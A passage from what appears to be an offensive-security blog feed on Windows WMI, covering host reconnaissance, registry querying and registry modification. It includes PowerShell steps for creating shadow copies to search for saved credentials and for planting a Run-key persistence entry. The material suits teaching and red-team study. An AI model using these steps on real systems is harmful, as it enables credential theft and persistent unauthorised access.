    <img src="servicemethods.png"  alt="services"  class="center"  />


<h3 id="logged-on-users">Logged-on Users</h3>
<p>Getting the logged-on users on a system is pretty trivial. There are two classes &ndash; <code>Win32_LoggedOnUser</code> and <code>Win32_LogOnSession</code> that holds the particulars about the session and users logged onto the system. Querying the class from a privileged user gives us much more information about the logged in users:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_loggedonuser
</span></span></code></pre></div>
    <img src="logged.png"  alt="log"  class="center"  />


<p>From the above, we can see that each logged-in user has an LUID (locally-unique identifier). Some LUIDs are predefined. For example, the LUID for the System account’s logon session is always 0x3e7 (999 decimal), the LUID for Network Service’s session is 0x3e4 (996), and Local Service’s is 0x3e5 (997). Most other LUIDs are randomly generated.</p>
<p>Each logged-on user defines its dependents via the <code>Dependent</code> property. We can get a list of logon IDs, the authentication type, start time and scope of every session using the <code>Win32_LogOnSession</code> class:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_logonsession <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> authenticationpackage,logonid,starttime,<span style="color:#66d9ef">scope</span>
</span></span></code></pre></div>
    <img src="session.png"  alt="session"  class="center"  />


<h3 id="installed-patches">Installed patches</h3>
<p>It&rsquo;s often useful to enumerate the updates/patches installed on a machine. If the system is missing important patches, that might open up an easy possibility to compromise the system in one quick shot. WMI has a class known as <code>Win32_QuickFixEngineering</code> which contains info about the installed updates and security patches. Querying the class is a piece of cake:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_quickfixengineering
</span></span></code></pre></div>
    <img src="patch.png"  alt="patches"  class="center"  />


<h3 id="event-logs">Event logs</h3>
<p>The class <code>Win32_NtLogEvent</code> gives us useful data about the events logs captured by the system. We can query it like the following:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_ntlogevent
</span></span></code></pre></div>
    <img src="event.png"  alt="patches"  class="center"  />


<p>Each log entry carries details like time, the source generating the event, severity and a message. The severity is indicated by the <code>Type</code> property in the output. Talking about event types, there are five different levels which are depicted in the table below:</p>
<table>
  <thead>
      <tr>
          <th>Value</th>
          <th>Meaning</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>1</td>
          <td>Error</td>
      </tr>
      <tr>
          <td>2</td>
          <td>Warning</td>
      </tr>
      <tr>
          <td>4</td>
          <td>Information</td>
      </tr>
      <tr>
          <td>8</td>
          <td>Security Audit Success</td>
      </tr>
      <tr>
          <td>16</td>
          <td>Security Audit Failure</td>
      </tr>
  </tbody>
</table>
<p>We can, of course, make use of the <code>-Filter</code> switch to search for specific event types.</p>
<h3 id="shares">Shares</h3>
<p>The <code>Win32_Share</code> class represents a shared resource on a system. This may be a disk drive, printer, interprocess communication, or other sharable devices. In enterprise networks, there are usually a lot of shares that might come in handy during a penetration test. Let us see how we can enumerate the available shares:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_share <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> <span style="color:#66d9ef">type</span>,name,allowmaximum,description,<span style="color:#66d9ef">scope</span>
</span></span></code></pre></div>
    <img src="shares.png"  alt="shares"  class="center"  />


<p>In the above example, we filtered only the required useful information using <code>select</code>. We have the share type, name, concurrent access permission, description and scope of every available share from the output of the command. Once again, types are constants that define the type of resources being shared:</p>
<table>
  <thead>
      <tr>
          <th>Value</th>
          <th>Meaning</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>0</td>
          <td>Disk Drive</td>
      </tr>
      <tr>
          <td>1</td>
          <td>Print Queue</td>
      </tr>
      <tr>
          <td>2</td>
          <td>Device</td>
      </tr>
      <tr>
          <td>3</td>
          <td>IPC</td>
      </tr>
      <tr>
          <td>2147483648</td>
          <td>Disk Drive Admin</td>
      </tr>
      <tr>
          <td>2147483649</td>
          <td>Print Queue Admin</td>
      </tr>
      <tr>
          <td>2147483650</td>
          <td>Device Admin</td>
      </tr>
      <tr>
          <td>2147483651</td>
          <td>IPC Admin</td>
      </tr>
  </tbody>
</table>
<p>The <code>AllowMaximum</code> is a boolean property indicating whether concurrent access to the resource has been restricted or not. If the value is set to <code>True</code>, then there is no restriction on the shared access, which otherwise might indicate that there is something sensitive in the resource, or better might have monitoring for clients accessing the share.</p>
<p>WMI also provides methods like <code>Create</code>, <code>SetShareInfo</code> and <code>Delete</code> for creating, updating and deleting shares.</p>

    <img src="sharemethods.png"  alt="shares"  class="center"  />


<h3 id="network-info">Network info</h3>
<p>Network information is provided by the <code>Win32_IP4RouteTable</code> class. This gives us details similar to the <code>ipconfig</code> command but in a much more detailed fashion.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_ip4routetable
</span></span></code></pre></div>
    <img src="network.png"  alt="shares"  class="center"  />


<p>I would like to mention another useful class called <code>Win32_NetworkAdapter</code> while talking about network stuff. Querying it can give us a useful indication about the network hardware that the system has. This in-turn is useful for VM detection, for example, we can run the following queries to identify whether the system is virtualized by VMWare:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> Win32_NetworkAdapter <span style="color:#f92672">-</span>Filter <span style="color:#e6db74">&#39;name like &#34;%vmware%&#34;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> Win32_NetworkAdapter <span style="color:#f92672">-</span>Filter <span style="color:#e6db74">&#39;manufacturer like &#34;%vmware%&#34;&#39;</span>
</span></span></code></pre></div><h3 id="user-accounts">User accounts</h3>
<p>User account information is provided by the <code>Win32_UserAccount</code> class. For a default local system, there are only a few accounts, the most common ones being the administrator, guest, local users and the windows defender (<code>WDAGUtilityAccount</code>). We can get a list of users quickly via:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_useraccount
</span></span></code></pre></div>
    <img src="accounts.png"  alt="shares"  class="center"  />


<p>However, for a domain-joined box or domain controller, there will be several others including <code>krbtgt</code>, <code>sqladmin</code>, <code>webadmin</code>, etc. For a default Windows Server 2012 setup, there are just 3 accounts as displayed below.</p>

    <img src="account1.png"  alt="shares"  class="center"  />


<h3 id="user-groups">User groups</h3>
<p>Similar to user accounts, user groups information is provided by the <code>Win32_Group</code> class. Querying the class on a local box is easy:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_group
</span></span></code></pre></div>
    <img src="group.png"  alt="shares"  class="center"  />


<p>If the same command is run in an enterprise environment, e.g. a domain-joined network, the number of groups would increase giving us a wider view of the user groups present on a network. This will include the local ones, the current domain, the trusted domain and the trusted forest as well:</p>

    <img src="group1.png"  alt="shares"  class="center"  />


<h3 id="system-secrets">System secrets</h3>
<p>System secrets are once again useful info to enumerate when it comes to recon. If we have enough privileges on the system, we can create <strong>shadow copies</strong> of the disk and try to extract secrets from there. But before that for those of you not familiar with shadow copies:</p>
<blockquote>
<p><strong>Shadow Copy</strong> is a technology included in Microsoft Windows that can create backup copies or snapshots of computer files or volumes, even when they are in use.</p></blockquote>
<p>To interact with the shadow copies, we have 2 available methods as seen in the picture below:</p>

    <img src="shadowmethods.png"  alt="shadowmethods"  class="center"  />


<p>Creating a quick shadow copy is easy, we just need to specify the volume and the context of the copy creation:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>(<span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_shadowcopy <span style="color:#f92672">-</span>List).<span style="color:#66d9ef">create</span>(<span style="color:#e6db74">&#34;C:\&#34;</span>, <span style="color:#e6db74">&#34;ClientAccessible&#34;</span>)
</span></span></code></pre></div>
    <img src="shadowcreate.png"  alt="shadowcreate"  class="center"  />


<p>To add to this, we can create a symlink to easily access the shadow copy from our local explorer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span>link <span style="color:#f92672">=</span> (<span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> win32_shadowcopy).deviceobject <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span>
</span></span><span style="display:flex;"><span>cmd <span style="color:#f92672">/</span><span style="color:#66d9ef">c</span> mklink <span style="color:#f92672">/</span>d <span style="color:#66d9ef">C</span>:<span style="color:#960050;background-color:#1e0010">\</span>shadowcopy <span style="color:#e6db74">&#34;$link&#34;</span>
</span></span></code></pre></div>
    <img src="shadowlink.png"  alt="shadowlink"  class="center"  />


<p>Once we have the shadow copy ready to use, we can simply run tools like <a href="https://github.com/Arvanaghi/SessionGopher/blob/master/SessionGopher.ps1"><code>Invoke-SessionGopher.ps1</code></a> with the <code>-Thorough</code> switch to search for secrets on the filesystem. This would yield saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP, etc. In my case, I found a few saved RDP sessions and PuTTY sessions using the script.</p>

    <img src="sessiongop.png"  alt="gopher"  class="center"  />


<h2 id="conclusion">Conclusion</h2>
<p>So this was all about information gathering over WMI for a single blog post. We saw how we can gather so much useful data in just a few key taps so conveniently. Of course, the information presented above is not exhaustive and there are endless possibilities to consider when it comes to reconnaissance.</p>
<p>That&rsquo;s it for now folks and I&rsquo;ll meet you in our next blog that will focus on Active Directory enumeration via WMI. Sláinte! 🥂</p>
]]></content>
        </item>
        
        <item>
            <title>Offensive WMI - Interacting with Windows Registry (Part 3)</title>
            <link>https://0xinfection.xyz/posts/offensive-wmi-interacting-with-windows-registry-part-3/</link>
            <pubDate>Sun, 12 Sep 2021 00:00:00 +0530</pubDate>
            
            <guid>https://0xinfection.xyz/posts/offensive-wmi-interacting-with-windows-registry-part-3/</guid>
            <description>&lt;p&gt;This is the third instalment of the &amp;ldquo;Offensive WMI&amp;rdquo; series (the 2nd is &lt;a href=&#34;https://0xinfection.github.io/posts/wmi-classes-methods-part-2/&#34;&gt;here&lt;/a&gt;), and this blog will focus on interacting with the Windows Registry. A useful thing to know before we start, MITRE ATT&amp;amp;CK classifies querying of registry values under &lt;a href=&#34;https://attack.mitre.org/techniques/T1012/&#34;&gt;T1012&lt;/a&gt; and its modification under &lt;a href=&#34;https://attack.mitre.org/techniques/T1112/&#34;&gt;T1112&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s dive in.&lt;/p&gt;
&lt;h2 id=&#34;what-is-windows-registry&#34;&gt;What is Windows Registry?&lt;/h2&gt;
&lt;p&gt;In simple terms, the registry is a database that stores configuration settings and options of the operating system: the kernel, device drivers, services, SAM, user interface and third party applications all make use of the registry. This makes the registry a very attractive resource for attackers.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>This is the third instalment of the &ldquo;Offensive WMI&rdquo; series (the 2nd is <a href="https://0xinfection.github.io/posts/wmi-classes-methods-part-2/">here</a>), and this blog will focus on interacting with the Windows Registry. A useful thing to know before we start, MITRE ATT&amp;CK classifies querying of registry values under <a href="https://attack.mitre.org/techniques/T1012/">T1012</a> and its modification under <a href="https://attack.mitre.org/techniques/T1112/">T1112</a>.</p>
<p>Let&rsquo;s dive in.</p>
<h2 id="what-is-windows-registry">What is Windows Registry?</h2>
<p>In simple terms, the registry is a database that stores configuration settings and options of the operating system: the kernel, device drivers, services, SAM, user interface and third party applications all make use of the registry. This makes the registry a very attractive resource for attackers.</p>
<p>The registry consists of sections known as <em>hives</em>, e.g. <code>HKEY_LOCAL_MACHINE</code>, <code>HKEY_CURRENT_USER</code>, etc. Upon inspection of the registry in <code>regedit.exe</code>, they appear to be arranged in a similar fashion to a filesystem. Each hive has a number of keys. The keys can have multiple subkeys. A key or subkey acts as a store for values. A registry item consists of a name and value pair.</p>
<h2 id="registry--wmi">Registry &amp; WMI</h2>
<p>WMI provides a class called <a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/regprov/stdregprov"><code>StdRegProv</code></a> for interacting with the Windows Registry. With this in hand, we can do a variety of things &ndash; including retrieval, creation, deletion and modification of keys and values. An important point to note here is that we need to use the <code>root\DEFAULT</code> namespace for working with the registry.</p>
<p>Let&rsquo;s start by exploring what methods are available to us:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">Get</span><span style="color:#f92672">-</span>WmiObject <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> StdRegProv <span style="color:#f92672">-</span>List <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">-</span>ExpandProperty methods
</span></span></code></pre></div>
    <img src="methods.png"  alt="namespace"  class="center"  />


<p>From the output above, we can see methods like <code>CreateKey</code>, <code>DeleteKey</code>, <code>EnumKey</code>, <code>EnumValues</code>, <code>DeleteValues</code>, etc, for interacting with the Registry. Interesting.</p>
<p>Two important things to know before jumping in:</p>
<ol>
<li>
<p>First, WMI uses constant numeric values to identify different hives in the registry. The table below lists the constants for accessing registry hives:</p>
<table>
  <thead>
      <tr>
          <th>Variable</th>
          <th>Value</th>
          <th>Hive</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>$HKCR</td>
          <td>2147483648</td>
          <td>HKEY_CLASSES_ROOT</td>
      </tr>
      <tr>
          <td>$HKCU</td>
          <td>2147483649</td>
          <td>HKEY_CURRENT_USER</td>
      </tr>
      <tr>
          <td>$HKLM</td>
          <td>2147483650</td>
          <td>HKEY_LOCAL_MACHINE</td>
      </tr>
      <tr>
          <td>$HKUS</td>
          <td>2147483651</td>
          <td>HKEY_USERS</td>
      </tr>
      <tr>
          <td>$HKCC</td>
          <td>2147483653</td>
          <td>HKEY_CURRENT_CONFIG</td>
      </tr>
  </tbody>
</table>
</li>
<li>
<p>And secondly, the registry has different data types, and each data type can be accessed using a particular method in WMI. The table below maps common data types to their methods:</p>
<table>
  <thead>
      <tr>
          <th>Method</th>
          <th>Data Type</th>
          <th>Type Value</th>
          <th>Function</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>GetStringValue</code></td>
          <td>REG_SZ</td>
          <td>1</td>
          <td>Returns a string.</td>
      </tr>
      <tr>
          <td><code>GetExpandedStringValue</code></td>
          <td>REG_EXPAND_SZ</td>
          <td>2</td>
          <td>Returns expanded references to env variables.</td>
      </tr>
      <tr>
          <td><code>GetBinaryValue</code></td>
          <td>REG_BINARY</td>
          <td>3</td>
          <td>Returns array of bytes.</td>
      </tr>
      <tr>
          <td><code>GetDWORDValue</code></td>
          <td>REG_DWORD</td>
          <td>4</td>
          <td>Returns a 32-bit number.</td>
      </tr>
      <tr>
          <td><code>GetMultiStringValue</code></td>
          <td>REG_MULTI_SZ</td>
          <td>7</td>
          <td>Returns multiple string values.</td>
      </tr>
      <tr>
          <td><code>GetQWORDValue</code></td>
          <td>REG_QWORD</td>
          <td>11</td>
          <td>Returns a 64-bit number.</td>
      </tr>
  </tbody>
</table>
</li>
</ol>
<h3 id="querying-the-registry">Querying the registry</h3>
<h4 id="enumerating-keys">Enumerating keys</h4>
<p>Now that we know the constants, let&rsquo;s try to enumerate the available subkeys under a well-known registry path <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion</code>. Putting together what we know so far, we can use this command to get all keys under the registry item:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name EnumKey <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483650</span>, <span style="color:#e6db74">&#34;software\microsoft\windows nt\currentversion&#34;</span>) <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> <span style="color:#f92672">-</span>ExpandProperty snames
</span></span></code></pre></div>
    <img src="scheduled.png"  alt="schedule"  class="center"  />


<blockquote>
<p><strong>NOTE</strong>: The same can be done with upper hierarchical registry paths as well. If you don&rsquo;t know the absolute path, you can explore the registry by simply replacing the path in the command above.</p>
<p>e.g. &ndash; If you replace the path <code>software\microsoft\windows nt\currentversion\schedule</code> in the above command with just <code>software</code>, then the output will list all subkeys under the <code>HKEY_LOCAL_MACHINE\Software</code>. This is helpful when exploring unknown nested items in a registry.</p></blockquote>
<h4 id="enumerating-values">Enumerating values</h4>
<p>Now that we know how to list the keys available under the registry item, lets enumerate the values under the <code>Drivers32</code> key:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name enumvalues <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483650</span>, <span style="color:#e6db74">&#34;software\microsoft\windows nt\currentversion\drivers32&#34;</span>)
</span></span></code></pre></div>
    <img src="values.png"  alt="schedule"  class="center"  />


<p>As we can see, the output contains the subkey names under <code>sNames</code> and the associated data type under <code>Types</code> property. Of course, we can use Powershell&rsquo;s <code>select -ExpandProperty</code> switch to have an extended view of the values of the properties returned in the output.</p>
<h4 id="reading-values">Reading values</h4>
<p>Now let us try to read the values of the subkeys. For our example, we&rsquo;ll be reading the values of the <code>Drivers32</code> subkey (which defines the Windows NT DLLs for applications). Several malware variants have been observed making use of this key (see <a href="https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/troj_riern.sma">Riern Trojan Family</a>) in the past.</p>
<p>The following command reads the value of the subkeys <code>aux</code> and <code>midi</code> under the <code>Drivers32</code> key. Please note that the method name passed to the cmdlet (via the <code>-Name</code> switch) will vary depending upon the registry data type (see the datatype table above).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name GetStringValue <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483650</span>, <span style="color:#e6db74">&#34;software\microsoft\windows nt\currentversion\drivers32&#34;</span>, <span style="color:#e6db74">&#34;aux&#34;</span>)
</span></span><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name GetStringValue <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483650</span>, <span style="color:#e6db74">&#34;software\microsoft\windows nt\currentversion\drivers32&#34;</span>, <span style="color:#e6db74">&#34;midi&#34;</span>) <span style="color:#f92672">|</span> <span style="color:#66d9ef">select</span> svalue
</span></span></code></pre></div>
    <img src="readstring.png"  alt="schedule"  class="center"  />


<blockquote>
<p><strong>TIP</strong>: <a href="https://www.dfir.training/ultimate-registry-forensics-cheat-sheet">Here is a good cheatsheet</a> of juicy locations in registry that can be useful for an attacker. You might want to try exploring them. :)</p></blockquote>
<h3 id="modifying-the-registry">Modifying the registry</h3>
<p>We now know about reading key and value pairs from the registry using WMI. These didn&rsquo;t require administrative privileges so far, however &ndash; creation, deletion and updating the keys and values <em>may</em> require elevated privileges.</p>
<p>Let&rsquo;s try to create new keys and subkeys. But before that, we need to check whether we have access to a specific registry item. Once again there are constants defining the access levels to the keys. The following table summarizes the permissions with associated constants:</p>
<table>
  <thead>
      <tr>
          <th>Method</th>
          <th>Value</th>
          <th>Function</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>KEY_QUERY_VALUE</code></td>
          <td>1</td>
          <td>Query the values of a registry key</td>
      </tr>
      <tr>
          <td><code>KEY_SET_VALUE</code></td>
          <td>2</td>
          <td>Create, delete, or set a registry value</td>
      </tr>
      <tr>
          <td><code>KEY_CREATE_SUB_KEY</code></td>
          <td>4</td>
          <td>Create a subkey of a registry key</td>
      </tr>
      <tr>
          <td><code>KEY_ENUMERATE_SUB_KEYS</code></td>
          <td>8</td>
          <td>Enumerate the subkeys of a registry key</td>
      </tr>
      <tr>
          <td><code>KEY_NOTIFY</code></td>
          <td>16</td>
          <td>Change notifications for a registry key or for subkeys of a registry key</td>
      </tr>
      <tr>
          <td><code>KEY_CREATE</code></td>
          <td>32</td>
          <td>Create a registry key</td>
      </tr>
      <tr>
          <td><code>DELETE</code></td>
          <td>65536</td>
          <td>Delete a registry key</td>
      </tr>
      <tr>
          <td><code>READ_CONTROL</code></td>
          <td>131072</td>
          <td>Combines the STANDARD_RIGHTS_READ, KEY_QUERY_VALUE, KEY_ENUMERATE_SUB_KEYS and KEY_NOTIFY values</td>
      </tr>
      <tr>
          <td><code>WRITE_DAC</code></td>
          <td>262144</td>
          <td>Modify the DACL in the object&rsquo;s security descriptor</td>
      </tr>
      <tr>
          <td><code>WRITE_OWNER</code></td>
          <td>524288</td>
          <td>Change the owner in the object&rsquo;s security descriptor</td>
      </tr>
  </tbody>
</table>
<h4 id="checking-permissions-of-a-key">Checking permissions of a key</h4>
<p>For our example, we&rsquo;ll pick the <code>Run</code> key under the hive <code>HKEY_CURRENT_USER</code> first, then the <code>HKEY_LOCAL_MACHINE</code>. Here&rsquo;s  how to do it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name CheckAccess <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483649</span>, <span style="color:#e6db74">&#34;software\microsoft\windows\currentversion\run&#34;</span>, <span style="color:#ae81ff">32</span>)
</span></span><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name CheckAccess <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483650</span>, <span style="color:#e6db74">&#34;software\microsoft\windows\currentversion\run&#34;</span>, <span style="color:#ae81ff">32</span>)
</span></span></code></pre></div>
    <img src="permissions.png"  alt="permissions"  class="center"  />


<p>The <code>bGranted</code> property in the output tells us whether we have access to the specific item in the registry. From the above example, we can clearly see that our user currently has access to the <code>Run</code> key under <code>HKEY_CURRENT_USER</code> but not <code>HKEY_LOCAL_MACHINE</code>.</p>
<h4 id="creating-registry-entries">Creating registry entries</h4>
<p>Now that we know that we have write access to the registry key <code>Run</code> under <code>HKEY_CURRENT_USER</code>, we&rsquo;ll add our favourite calculator app to the registry item. This will cause a calculator to pop up every time the system boots up, a very common technique seen in malwares to gain persistence.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name SetStringValue <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483649</span>, <span style="color:#e6db74">&#34;software\microsoft\windows\currentversion\run&#34;</span>, <span style="color:#e6db74">&#34;C:\Windows\System32\calc.exe&#34;</span>, <span style="color:#e6db74">&#34;Calculator&#34;</span>)
</span></span></code></pre></div>
    <img src="newsubkey.png"  alt="subkey"  class="center"  />


<p>Boom, our calculator app has achieved persistence. :D</p>
<blockquote>
<p><strong>NOTE</strong>: An existing subkey under a registry key can also be updated using the same above.</p></blockquote>
<h4 id="deleting-registry-entries">Deleting registry entries</h4>
<p>To delete a registry subkey we don&rsquo;t need the value:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name DeleteValue <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483649</span>, <span style="color:#e6db74">&#34;software\microsoft\windows\currentversion\run&#34;</span>, <span style="color:#e6db74">&#34;Calculator&#34;</span>)
</span></span></code></pre></div>
    <img src="deletesubkey.png"  alt="subkey"  class="center"  />


<h4 id="creating-new-keys">Creating new keys</h4>
<p>In few cases, we <em>might</em> need to create keys under the main tree hierarchy. Let&rsquo;s say we want to create a new key called <code>CustomAgent</code> under the <code>HKEY_LOCAL_MACHINE\Software\OpenSSH</code> registry item. The process looks extremely simple:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>Invoke<span style="color:#f92672">-</span>WmiMethod <span style="color:#f92672">-</span>Namespace root<span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">default</span> <span style="color:#f92672">-</span><span style="color:#66d9ef">Class</span> stdregprov <span style="color:#f92672">-</span>Name CreateKey <span style="color:#f92672">@</span>(<span style="color:#ae81ff">2147483650</span>, <span style="color:#e6db74">&#34;software\openssh\CustomAgent&#34;</span>)
</span></span></code></pre></div>
    <img src="newkey.png"  alt="newkey"  class="center"  />


<h4 id="deleting-keys">Deleting keys</h4>
<p>Deleting the key is equally simple:</p>
